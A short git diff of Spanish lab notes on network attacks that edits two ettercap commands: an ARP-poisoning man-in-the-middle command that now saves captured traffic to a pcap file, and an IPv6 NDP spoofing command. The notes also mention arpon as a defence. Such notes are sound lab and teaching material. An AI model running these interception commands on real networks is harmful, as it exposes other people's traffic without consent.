@@ -17,7 +17,7 @@ Captura de trafico, usando ettercap + wireshark para snifear y visualizar data (
 ### Spoofing
 Comando básico para realizar spoofing:
 ```bash
-ettercap -T -q -i ens33 -M arp:remote //10.11.48.142/ //10.11.48.1/
+ettercap -T -q -i ens33 -M arp:remote //10.11.48.142/ //10.11.48.1/ -w bisbi.pcap
 ```
 - -T, text mode
 - -q, filtra lo que se muestra por pantalla.
@@ -90,7 +90,7 @@ Social:
 # H)x
 MITM ipv6 ettercap + ndp
 ```
-ettercap -T -i 6to4 -Q -M ndp //2002:a0b:308e::1/ //::10.11.48.1
+ettercap -T -i 6to4 -Q -M ndp:remote //2002:a0b:308e::1/ //2002:a0b:308e::1/
 ```
 # I)x
 arpon(defensa) vs ettercap + arp poisoning(ataque)
